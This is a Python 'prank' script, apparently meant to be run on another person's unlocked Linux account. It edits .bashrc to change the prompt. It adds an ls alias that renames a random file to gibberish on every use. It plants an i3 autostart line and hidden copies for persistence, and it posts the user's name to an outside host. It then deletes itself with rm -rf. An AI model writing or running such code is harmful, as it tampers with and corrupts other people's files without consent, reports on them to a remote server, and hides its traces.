import sys
import socket
from datetime import datetime
import getpass
import os
import json
import subprocess

FILE_PATH = os.path.dirname(os.path.realpath(__file__))+"/"
USER = getpass.getuser()
HOME = "/home/%s/" % USER
BASHRC = HOME + ".bashrc"
ALIASES = HOME + ".bash_aliases"
I3CONF = HOME + ".config/i3/config"
SAVE = HOME + ".config/.vinrc/"

backup_files = [BASHRC, ALIASES, I3CONF]
persistence_files = [BASHRC, ALIASES, I3CONF]

def append_to_file(path, text):
    f = open(path, "a")
    f.write(str(text))
    f.close()

def insert_to_file(path, text):
    f = open(path, "r")
    old_file = f.read()
    f.close()
    f = open(path, "w")
    f.write(str(text)+old_file)

class C_evil:
    def __init__(self):
        self.report = {}
        self.report['time_at_run'] = datetime.now().strftime('%d/%m/%Y, %H:%M:%S')
        self.report['username'] = USER
        self.report['prank'] = {}
        self.options = ''
        return

    def menu(self):
        print("""\n\n
                     i3 prank
                    version 0.1\n\n

Type all the number and letters you want to trigger and press enter
0. clean_up
1. PS1 i3lock
2. renaming ls
9. persistence""")
        self.options = input()
        return

    def run_if_menu(self, char, func):
        if str(char) in self.options:
            func()
        return

    def start(self):
        self.bkp()
        self.menu()
        self.run_if_menu(1, self.PS1)
        self.run_if_menu(2, self.renameing_ls)
        self.run_if_menu(9, self.persistence)
        self.http_post()
        self.run_if_menu(0, self.clean_up)
        return

    def PS1(self):
        append_to_file(BASHRC, "PS1=\"\\[\\e[0m\\]\\[\\e[97;105;5m\\]\\u, never forget to i3lock >\\[\\e[m\\]\\[\\e[0m\\] \"\n")
        self.report['prank']["PS1"] = True
        return

    def renameing_ls(self):
        append_to_file(ALIASES, "function ls { /bin/ls $@; F=$(/bin/ls | shuf -n 1); N=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20); mv $F $N;}\n")
        self.report['prank']["renameing_ls"] = True
        return

    def persistence(self):
        r = []
        insert_to_file(I3CONF, "exec --no-startup-id python3 " + SAVE + "persistence.py" + "\n")
        if not os.path.isdir(SAVE):
            os.mkdir(SAVE[:-1])
        for f in persistence_files:
            if os.path.isfile(f):
                r.append((f, str(subprocess.run(["stat", "-c %Y", f], stdout=subprocess.PIPE).stdout)[3:-3]))
                subprocess.run(["cp", f, SAVE], stdout=subprocess.PIPE)
        subprocess.run(["cp", FILE_PATH+"persistence.py", SAVE], stdout=subprocess.PIPE)
        f = open(SAVE+"times.txt", "w")
        f.write(json.dumps(r))
        f.close()
        return

    def bkp(self):
        if not os.path.isdir(SAVE):
            os.mkdir(SAVE[:-1])
        return

    def http_post(self):
        HOST = "beginerwebdev.pythonanywhere.com"
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST,80))
        payload = json.dumps(self.report)
        l = str(len(payload))
        request = "POST / HTTP/1.1\r\nHost: %s\r\nContent-Type: application/json\r\nContent-Length: %s\r\n\r\n%s" % (HOST, l, payload)
        client.send(request.encode())
        r = str(client.recv(4096)).split(' ')[1]
        print("Sending report <%s>" % r)
        return

    def clean_up(self):
        if "afs" in FILE_PATH:
            print("'afs' detected in FILE_PATH\nPlease do manual cleaning")
            return
        r = subprocess.run(["rm", "-rf", FILE_PATH], stdout=subprocess.PIPE).returncode
        if r == 0:
            print("folder cleaned up")
        else:
            print("ERROR while cleaning up\nPlease do manual cleaning")
        return

e = C_evil()
e.start()